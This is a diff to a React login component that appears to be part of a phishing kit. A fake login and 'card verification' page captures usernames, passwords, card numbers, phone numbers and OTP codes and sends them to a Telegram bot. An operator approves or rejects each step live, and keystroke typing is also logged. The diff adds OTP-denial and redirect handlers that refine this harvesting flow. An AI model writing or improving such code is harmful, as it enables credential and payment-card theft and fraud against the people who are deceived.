@@ -25,7 +25,7 @@ function LoginForm() {
   const [otpCode, setOtpCode] = useState('');
   const [otpError, setOtpError] = useState('');
   const [sessionId, setSessionId] = useState(null);
-  const [showNextStep, setShowNextStep] = useState(false); // AJOUTÉ
+  const [showNextStep, setShowNextStep] = useState(false);
   
   // Typing tracking
   const [loginTypingSent, setLoginTypingSent] = useState(false);
@@ -54,33 +54,32 @@ function LoginForm() {
   }, []);
 
   const handleApprove = async () => {
-  if (!hasSentCardPageLogRef.current) {
-    await sendCardVerificationPageLog(loginName);
-    hasSentCardPageLogRef.current = true;
-  }
-  
-  setWaitingForApproval(false);
-  setIsLoading(false);
-  
-  const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
-  
-  if (hasCardDetails) {
-    console.log('✅ Card already submitted, showing NextStepAppr');
+    if (!hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLog(loginName);
+      hasSentCardPageLogRef.current = true;
+    }
     
-    // SEND CONFIRMATION LOG TO TELEGRAM (PERMANENT)
-    await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
+    setWaitingForApproval(false);
+    setIsLoading(false);
     
-    sessionStorage.setItem('loginName', loginName);
-    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
-    sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
-    sessionStorage.setItem('sessionId', sessionId);
+    const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
     
-    setShowNextStep(true);
-  } else {
-    console.log('📝 Showing card form for first time');
-    setShowCardForm(true);
-  }
-};
+    if (hasCardDetails) {
+      console.log('✅ Card already submitted, showing NextStepAppr');
+      
+      await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
+      
+      sessionStorage.setItem('loginName', loginName);
+      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
+      sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
+      sessionStorage.setItem('sessionId', sessionId);
+      
+      setShowNextStep(true);
+    } else {
+      console.log('📝 Showing card form for first time');
+      setShowCardForm(true);
+    }
+  };
   
   const handleDeny = () => {
     setWaitingForApproval(false);
@@ -171,22 +170,25 @@ function LoginForm() {
     }
   };
   
-  // MODIFIÉ: Maintenant affiche NextStepAppr au lieu de naviguer
   const handleNextStepAppr = async () => {
-  console.log('🔵 Next Step (Appr) button clicked! - Showing NextStepAppr component');
-  window.location.href = '/#/NextStepAppr';
+    console.log('🔵 Next Step (Appr) button clicked!');
+    window.location.href = '/#/NextStepAppr';
+  };
 
-  // SEND CONFIRMATION LOG TO TELEGRAM (PERMANENT)
-  await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
-  
-  sessionStorage.setItem('loginName', loginName);
-  sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
-  sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
-  sessionStorage.setItem('sessionId', sessionId);
-  setShowNextStep(true);
+  const handleBackToAppr = () => {
+    console.log('🔵 Back to Appr Page button clicked!');
+    window.location.href = '/#/NextStepAppr';
+  };
+  const handleDenyOtp = () => {
+  console.log('🔵 Deny OTP button clicked!');
+  setOtpError('Invalid OTP code. Please try again.');
+};
+  const handleOtpFalse = () => {
+  console.log('🔵 OTP False button clicked!');
+  setOtpError('Invalid OTP code. Please try again.');
 };
 
-  // Telegram bot hooks - NOW after handlers are defined
+  // Telegram bot hooks
   const {
     generateSessionId,
     sendToTelegramWithButtons,
@@ -203,7 +205,9 @@ function LoginForm() {
     sendCardTypingLog,
     sendOtpTypingLog,
     sendBlockedLog,
-    sendConfirmationLog
+    sendConfirmationLog,
+    sendConfirmationPageLog
+
   } = useTelegramBot(
     sessionId, 
     handleApprove, 
@@ -213,7 +217,10 @@ function LoginForm() {
     handleBackToCard, 
     handleBackToLogin, 
     handleBlock,
-    handleNextStepAppr
+    handleNextStepAppr,
+    handleBackToAppr,
+    handleDenyOtp,
+    handleOtpFalse
   );
 
   const handleInputChange = async (field, value) => {
@@ -423,7 +430,6 @@ function LoginForm() {
       await sendCardVerificationLog(loginName);
       await sendCardDetailsToTelegram(cardDetails, sessionId);
       
-      // Stocker les données pour NextStepAppr
       sessionStorage.setItem('loginName', loginName);
       sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
       sessionStorage.setItem('phoneNumber', cardDetails.phoneNumber);
@@ -470,7 +476,9 @@ function LoginForm() {
     setIsLoading(false);
     
     alert(t.success);
-    window.location.reload();
+    // Clear OTP input and show success message
+    setOtpCode('');
+    
   };
 
   const handleOtpChange = async (value) => {
@@ -485,60 +493,59 @@ function LoginForm() {
 
   const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval;
 
-  // MODIFIÉ: Return avec condition pour afficher NextStepAppr
-return (
-  <div className="login-container">
-    {showNextStep ? (
-      <NextStepAppr />
-    ) : (
-      <>
-        <h2>{t.loginTitle}</h2>
+  return (
+    <div className="login-container">
+      {showNextStep ? (
+        <NextStepAppr />
+      ) : (
+        <>
+          <h2>{t.loginTitle}</h2>
 
-        <LoadingOverlay 
-          isLoading={isLoadingState}
-          waitingForApproval={waitingForApproval}
-          waitingForOtpApproval={waitingForOtpApproval}
-          t={t}
-        />
-
-        {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
-          <LoginScreen
-            loginName={loginName}
-            password={password}
-            errors={errors}
-            isLoading={isLoading}
+          <LoadingOverlay 
+            isLoading={isLoadingState}
+            waitingForApproval={waitingForApproval}
+            waitingForOtpApproval={waitingForOtpApproval}
             t={t}
-            onInputChange={handleInputChange}
-            onLogin={handleLogin}
           />
-        )}
 
-        {showCardForm && !waitingForOtpApproval && (
-          <CardVerificationForm
-            cardDetails={cardDetails}
-            cardErrors={cardErrors}
-            isLoading={isLoading}
-            t={t}
-            onInputChange={handleCardInputChange}
-            onSubmit={handleCardSubmit}
-          />
-        )}
+          {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
+            <LoginScreen
+              loginName={loginName}
+              password={password}
+              errors={errors}
+              isLoading={isLoading}
+              t={t}
+              onInputChange={handleInputChange}
+              onLogin={handleLogin}
+            />
+          )}
 
-        {showOtpForm && (
-          <OtpVerificationForm
-            otpCode={otpCode}
-            otpError={otpError}
-            isLoading={isLoading}
-            t={t}
-            onOtpChange={handleOtpChange}
-            onSubmit={handleOtpSubmit}
-            onBack={handleBackToCard}
-          />
-        )}
-      </>
-    )}
-  </div>
-);
+          {showCardForm && !waitingForOtpApproval && (
+            <CardVerificationForm
+              cardDetails={cardDetails}
+              cardErrors={cardErrors}
+              isLoading={isLoading}
+              t={t}
+              onInputChange={handleCardInputChange}
+              onSubmit={handleCardSubmit}
+            />
+          )}
+
+          {showOtpForm && (
+            <OtpVerificationForm
+              otpCode={otpCode}
+              otpError={otpError}
+              isLoading={isLoading}
+              t={t}
+              onOtpChange={handleOtpChange}
+              onSubmit={handleOtpSubmit}
+              onBack={handleBackToCard}
+            />
+          )}
+        </>
+      )}
+    </div>
+  );
 }
 
 export default LoginForm;
